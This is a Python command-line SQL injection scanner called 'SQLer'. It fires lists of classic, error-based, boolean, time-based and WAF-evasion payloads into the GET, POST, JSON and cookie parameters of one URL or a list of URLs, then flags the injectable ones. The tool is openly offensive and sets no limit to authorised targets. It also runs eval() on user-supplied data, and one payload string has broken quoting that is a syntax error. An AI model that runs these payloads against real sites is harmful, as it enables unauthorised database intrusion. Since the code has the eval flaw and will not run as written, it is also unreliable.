import argparse
import sys
import os
import time
import random
import string
import requests
import threading
import copy
import urllib.parse
from typing import List, Dict, Any, Optional

class SQLiPayloads:
    CLASSIC = [
        "'", '"', "'--", '"--', "')", '")', "' OR '1'='1", '" OR "1"="1',
        "' OR 1=1--", '" OR 1=1--', "' OR 'a'='a", '" OR "a"="a',
    ]
    ERROR_BASED = [
        "'", '"', "' OR 1=1--", '" OR 1=1--',
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ]
    BOOLEAN_BASED = [
        "' AND 1=1--", "' AND 1=2--", '" AND 1=1--', '" AND 1=2--',
        "') AND 1=1--", '") AND 1=1--', "') AND 1=2--", '") AND 1=2--',
    ]
    TIME_BASED = [
        "' AND SLEEP(5)-- ", '" AND SLEEP(5)-- ',
        "' WAITFOR DELAY '0:0:5'--", '" WAITFOR DELAY '0:0:5'--',
    ]
    WAF_BYPASS = [
        "'/*!50000OR*/1=1--", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1-- -", "' OR 1=1--+",
        "' OR 1=1;--", "' OR 1=1;%00", "' OR 1=1;%23", "' OR 1=1;%2D%2D",
    ]
    TAMPERED = [
        "%27%20OR%201%3D1--", "%27%20OR%20%271%27%3D%271--", "%22%20OR%20%221%22%3D%221--",
    ]
    @staticmethod
    def double_encode(payload):
        return urllib.parse.quote(urllib.parse.quote(payload))
    @staticmethod
    def case_swap(payload):
        return ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)])
    @staticmethod
    def comment_inject(payload):
        return payload + '/*comment*/'
    @staticmethod
    def all(payload):
        return [payload, SQLiPayloads.double_encode(payload), SQLiPayloads.case_swap(payload), SQLiPayloads.comment_inject(payload)]
    @staticmethod
    def all_payloads():
        base = SQLiPayloads.CLASSIC + SQLiPayloads.ERROR_BASED + SQLiPayloads.BOOLEAN_BASED + SQLiPayloads.TIME_BASED + SQLiPayloads.WAF_BYPASS + SQLiPayloads.TAMPERED
        allp = []
        for p in base:
            allp.extend(SQLiPayloads.all(p))
        return list(set(allp))

class SQLer:
    def __init__(self, urls: List[str], method: str = 'GET', data: Optional[str] = None, json_data: Optional[str] = None, cookies: Optional[str] = None, threads: int = 5, verbose: bool = True):
        self.urls = urls
        self.session = requests.Session()
        self.timeout = 10
        self.verbose = verbose
        self.method = method.upper()
        self.data = data
        self.json_data = json_data
        self.cookies = cookies
        self.threads = threads

    def run(self):
        threads = []
        for url in self.urls:
            t = threading.Thread(target=self.scan_url, args=(url,))
            t.start()
            threads.append(t)
            if len(threads) >= self.threads:
                for th in threads:
                    th.join()
                threads = []
        for th in threads:
            th.join()

    def scan_url(self, url: str):
        print(f"[+] Scanning: {url}")
        result = self.detect_sqli(url)
        if result['vulnerable']:
            print(f"[!!!] SQLi Detected: {url}")
            print(f"[DETAILS] {result['details']}")
        else:
            print(f"[-] No SQLi detected: {url}")

    def detect_sqli(self, url: str) -> dict:
        details = []
        vulnerable = False
        params, post_data, json_data, cookie_dict = self.discover_params(url)
        baseline = self.get_baseline(url, params, post_data, json_data, cookie_dict)
        for param_type, param_dict in [('GET', params), ('POST', post_data), ('JSON', json_data), ('COOKIE', cookie_dict)]:
            if not param_dict:
                continue
            for param in param_dict:
                for payload in SQLiPayloads.all_payloads():
                    test_params = copy.deepcopy(params)
                    test_post = copy.deepcopy(post_data)
                    test_json = copy.deepcopy(json_data)
                    test_cookies = copy.deepcopy(cookie_dict)
                    if param_type == 'GET':
                        test_params[param] = param_dict[param] + payload
                    elif param_type == 'POST':
                        test_post[param] = param_dict[param] + payload
                    elif param_type == 'JSON':
                        test_json[param] = param_dict[param] + payload
                    elif param_type == 'COOKIE':
                        test_cookies[param] = param_dict[param] + payload
                    try:
                        start = time.time()
                        resp = self.send_request(url, test_params, test_post, test_json, test_cookies)
                        elapsed = time.time() - start
                        analysis = self.analyze_response(resp, payload, elapsed, baseline)
                        if self.verbose:
                            print(f"[PAYLOAD] {payload} | Param: {param} | Type: {param_type}")
                            print(f"[RESPONSE] Status: {resp.status_code}, Time: {elapsed:.2f}s, Length: {len(resp.text)}")
                        if analysis['vulnerable']:
                            details.append(analysis['details'] + f" | Param: {param} | Type: {param_type}")
                            vulnerable = True
                            print(f"[!!!] Confirmed SQLi with payload: {payload} | Param: {param} | Type: {param_type}")
                            print(f"[DETAILS] {analysis['details']}")
                    except Exception as e:
                        if self.verbose:
                            print(f"[ERROR] {e}")
        return {'vulnerable': vulnerable, 'details': details if details else 'No SQLi detected'}

    def discover_params(self, url: str):
        # GET params
        params = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
        # POST data
        post_data = eval(self.data) if self.data else {}
        # JSON data
        json_data = eval(self.json_data) if self.json_data else {}
        # Cookies
        cookie_dict = {}
        if self.cookies:
            for c in self.cookies.split(';'):
                if '=' in c:
                    k, v = c.strip().split('=', 1)
                    cookie_dict[k] = v
        return params, post_data, json_data, cookie_dict

    def get_baseline(self, url, params, post_data, json_data, cookies):
        try:
            resp = self.send_request(url, params, post_data, json_data, cookies)
            return {'status': resp.status_code, 'length': len(resp.text), 'text': resp.text}
        except Exception:
            return {'status': None, 'length': 0, 'text': ''}

    def send_request(self, url, params, post_data, json_data, cookies):
        req_cookies = cookies if cookies else None
        if self.method == 'POST':
            if json_data:
                return self.session.post(url.split('?')[0], params=params, json=json_data, cookies=req_cookies, timeout=self.timeout, allow_redirects=True)
            elif post_data:
                return self.session.post(url.split('?')[0], params=params, data=post_data, cookies=req_cookies, timeout=self.timeout, allow_redirects=True)
            else:
                return self.session.post(url.split('?')[0], params=params, cookies=req_cookies, timeout=self.timeout, allow_redirects=True)
        else:
            return self.session.get(url.split('?')[0], params=params, cookies=req_cookies, timeout=self.timeout, allow_redirects=True)

    def analyze_response(self, resp: requests.Response, payload: str, elapsed: float, baseline: dict) -> Dict[str, Any]:
        error_signatures = [
            'You have an error in your SQL syntax',
            'Warning: mysql_',
            'Unclosed quotation mark',
            'quoted string not properly terminated',
            'SQLSTATE',
            'syntax error',
            'ORA-01756',
            'ODBC SQL Server Driver',
            'Microsoft OLE DB Provider for SQL Server',
            'PostgreSQL query failed',
            'supplied argument is not a valid MySQL',
        ]
        for sig in error_signatures:
            if sig.lower() in resp.text.lower():
                return {'vulnerable': True, 'details': f'Error-based SQLi detected with payload: {payload} | Signature: {sig}'}
        # Boolean-based: advanced diffing
        if payload in SQLiPayloads.BOOLEAN_BASED:
            if '1=1' in payload and resp.status_code == 200 and self.advanced_diff(resp.text, baseline['text']):
                return {'vulnerable': True, 'details': f'Boolean-based SQLi detected with payload: {payload}'}
        # Time-based
        if payload in SQLiPayloads.TIME_BASED and elapsed > 4.5:
            return {'vulnerable': True, 'details': f'Time-based SQLi detected with payload: {payload} | Response time: {elapsed:.2f}s'}
        # WAF bypass/tampered
        if payload in SQLiPayloads.WAF_BYPASS + SQLiPayloads.TAMPERED:
            if any(sig.lower() in resp.text.lower() for sig in error_signatures):
                return {'vulnerable': True, 'details': f'WAF bypass SQLi detected with payload: {payload}'}
        return {'vulnerable': False, 'details': 'No SQLi detected'}

    def advanced_diff(self, text1, text2):
        # Simple diff: if difference is significant, return True
        if abs(len(text1) - len(text2)) > 20:
            return True
        # Token diff
        set1 = set(text1.split())
        set2 = set(text2.split())
        diff = set1.symmetric_difference(set2)
        return len(diff) > 10

def parse_args():
    parser = argparse.ArgumentParser(description='SQLer: Advanced SQLi Detection Tool')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Target single URL')
    group.add_argument('-l', '--list', help='File with list of URLs (one per line)')
    parser.add_argument('-X', '--method', default='GET', help='HTTP method: GET or POST')
    parser.add_argument('--data', help='POST data as dict string, e.g. "{\'user\': \'admin\', \'pass\': \'123\'}"')
    parser.add_argument('--json', help='POST JSON as dict string, e.g. "{\'user\': \'admin\', \'pass\': \'123\'}"')
    parser.add_argument('--cookies', help='Cookies as string, e.g. "PHPSESSID=123; token=abc"')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
    parser.add_argument('--no-verbose', action='store_true', help='Disable verbose output')
    return parser.parse_args()

def main():
    args = parse_args()
    urls = []
    if args.url:
        urls = [args.url]
    elif args.list:
        if not os.path.isfile(args.list):
            print(f"[ERROR] List file not found: {args.list}")
            sys.exit(1)
        with open(args.list, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    if not urls:
        print("[ERROR] No URLs provided.")
        sys.exit(1)
    sqler = SQLer(urls, method=args.method, data=args.data, json_data=args.json, cookies=args.cookies, threads=args.threads, verbose=not args.no_verbose)
    sqler.run()

if __name__ == '__main__':
    main()